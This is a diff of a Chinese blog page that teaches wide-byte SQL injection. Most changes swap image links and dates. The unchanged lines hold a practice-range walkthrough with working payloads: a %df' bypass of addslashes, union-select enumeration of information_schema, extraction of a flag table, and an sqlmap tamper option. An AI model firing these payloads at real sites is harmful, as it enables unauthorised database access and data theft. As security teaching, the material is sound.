@@ -28,24 +28,24 @@
 <meta property="og:site_name" content="kilig&#39;s Blog">
 <meta property="og:description" content="SQL注入-宽字节注入 注入基础GBK 编码 两个字节表示一个字符 ASCII 编码 一个字节表示一个字符 MYSQL默认字节集是GBK等宽字节字符集 addslashes()函数1234567addslashes ( string &#96;$str&#96; ) : string返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（&#96;&amp;#x27;&#96;）、双引号（&#96;&quot;">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410123856157.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124011684.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124145409.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-10-Chinese%5C2024101713005560.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-10-Chinese%5C2024101713005664.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-10-Chinese%5C2024101713005667.png">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124429623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3Cmark%3E,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124608697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3C/mark%3E,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124718976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124738583.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410124939915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410125041699.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410140314506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410140621232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410141019719.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/20210410141359608.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-10-Chinese%5C2024101713005676.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-10-Chinese%5C2024101713005777.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-10-Chinese%5C2024101713005782.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-10-Chinese%5C2024101713005785.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-10-Chinese%5C2024101713005795.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-10-Chinese%5C20241017130057104.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-10-Chinese%5C20241017130058115.png">
+<meta property="og:image" content="http://example.com/Image%5CSQL-10-Chinese%5C20241017130058124.png">
 <meta property="article:published_time" content="2022-11-11T11:39:41.000Z">
-<meta property="article:modified_time" content="2023-03-07T13:29:10.595Z">
+<meta property="article:modified_time" content="2024-10-17T05:00:58.651Z">
 <meta property="article:author" content="kiligwh">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20210410123856157.png">
+<meta name="twitter:image" content="http://example.com/Image%5CSQL-10-Chinese%5C2024101713005560.png">
 
 
 <link rel="canonical" href="http://example.com/2022/11/11/SQL%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/">
@@ -244,27 +244,27 @@
 <p>%20———-空格</p>
 <p>%23———–#号</p>
 <p>%5c————\反斜杠</p>
-<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="https://img-blog.csdnimg.cn/20210410123856157.png" alt="在这里插入图片描述"></p>
-<p>2、使用反斜杠进行探测<br>明明只输入了一个反斜杠，在查询语句中却出现了两个<br><img src="https://img-blog.csdnimg.cn/20210410124011684.png" alt="在这里插入图片描述"></p>
-<p>输入一个单引号却出现反斜杠+单引号<br><img src="https://img-blog.csdnimg.cn/20210410124145409.png" alt="在这里插入图片描述"></p>
-<p>3、有此可以判断，使用了转义函数addslashes()或者魔术引号，试一试可否进行宽字节注入<br>输入%df’，页面报错，好事情<br><img src="https://img-blog.csdnimg.cn/20210410124429623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3Cmark%3E,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4、在’后加上注释符– q<br>页面返回正常，存在宽字节注入<br><img src="https://img-blog.csdnimg.cn/20210410124608697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3C/mark%3E,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5、使用order by 判断字段数<br><img src="https://img-blog.csdnimg.cn/20210410124718976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210410124738583.png" alt="在这里插入图片描述"><br>可知字段数为3</p>
-<p>6、使用联合查询，探测回显点<br>得到回显点2,3<br><img src="https://img-blog.csdnimg.cn/20210410124939915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>7、使用version()，查询数据库版本号<br><img src="https://img-blog.csdnimg.cn/20210410125041699.png" alt="在这里插入图片描述"><br>5.0以上版本，可以使用information_schema数据库得出数据</p>
+<h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><p>1、进入靶场<br><img src="/Image%5CSQL-10-Chinese%5C2024101713005560.png" alt="在这里插入图片描述"></p>
+<p>2、使用反斜杠进行探测<br>明明只输入了一个反斜杠，在查询语句中却出现了两个<br><img src="/Image%5CSQL-10-Chinese%5C2024101713005664.png" alt="在这里插入图片描述"></p>
+<p>输入一个单引号却出现反斜杠+单引号<br><img src="/Image%5CSQL-10-Chinese%5C2024101713005667.png" alt="在这里插入图片描述"></p>
+<p>3、有此可以判断，使用了转义函数addslashes()或者魔术引号，试一试可否进行宽字节注入<br>输入%df’，页面报错，好事情<br><img src="https://img-blog.csdnimg.cn/20210410124429623.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3Cmark%3E,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>4、在’后加上注释符– q<br>页面返回正常，存在宽字节注入<br><img src="https://img-blog.csdnimg.cn/20210410124608697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ%3C/mark%3E,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>5、使用order by 判断字段数<br><img src="/Image%5CSQL-10-Chinese%5C2024101713005676.png" alt="在这里插入图片描述"><br><img src="/Image%5CSQL-10-Chinese%5C2024101713005777.png" alt="在这里插入图片描述"><br>可知字段数为3</p>
+<p>6、使用联合查询，探测回显点<br>得到回显点2,3<br><img src="/Image%5CSQL-10-Chinese%5C2024101713005782.png" alt="在这里插入图片描述"></p>
+<p>7、使用version()，查询数据库版本号<br><img src="/Image%5CSQL-10-Chinese%5C2024101713005785.png" alt="在这里插入图片描述"><br>5.0以上版本，可以使用information_schema数据库得出数据</p>
 <p>8、使用limit依次爆出表名</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php?id=0%df&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,table_name <span class="keyword">from</span> </span><br><span class="line">information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>-- q</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210410140314506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>9、查看china_flag表下的字段名<br>使用联合查询时</p>
+<p><img src="/Image%5CSQL-10-Chinese%5C2024101713005795.png" alt="在这里插入图片描述"><br>9、查看china_flag表下的字段名<br>使用联合查询时</p>
 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?<span class="attribute">id</span>=0%df&#x27; union select 1,2,group_concat(column_name) <span class="keyword">from</span> information_schema.columns</span><br><span class="line"> where <span class="attribute">table_schema</span>=database() <span class="keyword">and</span> <span class="attribute">table_name</span>=<span class="string">&#x27;china_flag&#x27;</span>-- q</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210410140621232.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjI0ODg3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-10-Chinese%5C20241017130057104.png" alt="在这里插入图片描述"></p>
 <p>此时可采用子查询的方式</p>
 <figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">index.php?id=0%df&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> </span><br><span class="line">table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=</span><br><span class="line"> (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line"> -- q</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210410141019719.png" alt="在这里插入图片描述"><br>得到china_flag表下的Id和C_Flag字段</p>
+<p><img src="/Image%5CSQL-10-Chinese%5C20241017130058115.png" alt="在这里插入图片描述"><br>得到china_flag表下的Id和C_Flag字段</p>
 <p>10、使用limit依次爆出Id和C_Flag字段信息</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">index</span>.php?id=<span class="number">0</span>%df&#x27; union select <span class="number">1</span>,Id,C_Flag from china_flag limit <span class="number">0</span>,<span class="number">1</span>-- q</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://img-blog.csdnimg.cn/20210410141359608.png" alt="在这里插入图片描述"></p>
+<p><img src="/Image%5CSQL-10-Chinese%5C20241017130058124.png" alt="在这里插入图片描述"></p>
 <h1 id="SQLMap跑宽字节注入"><a href="#SQLMap跑宽字节注入" class="headerlink" title="SQLMap跑宽字节注入"></a>SQLMap跑宽字节注入</h1><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在已知存在宽字节注入的情况下，可使用sqlmap的参数：</span><br><span class="line"> <span class="comment">--tamper  unmagicquotes.py</span></span><br></pre></td></tr></table></figure>
     </div>
 
@@ -306,7 +306,7 @@
 
 <div class="copyright">
   &copy; 
-  <span itemprop="copyrightYear">2023</span>
+  <span itemprop="copyrightYear">2024</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
